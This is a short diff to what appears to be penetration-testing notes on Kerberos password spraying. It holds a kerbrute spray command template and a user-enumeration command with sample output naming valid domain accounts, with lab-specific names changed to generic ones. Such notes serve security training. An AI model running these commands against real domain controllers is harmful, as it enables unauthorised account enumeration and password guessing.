@@ -5,10 +5,10 @@ Password Spray
 ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
 
 
-python kerbrute.py -users /home/kali/provinggrounds/heist/users.txt -domain heist.offsec -dc-ip 192.168.224.x
+python kerbrute.py -users /home/kali/users.txt -domain domain.local -dc-ip 192.168.224.x
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-[*] Valid user => enox
+[*] Valid user => mute
 [*] Valid user => administrator
 [*] Blocked/Disabled user => krbtgt
 [*] Valid user => svc_apache$
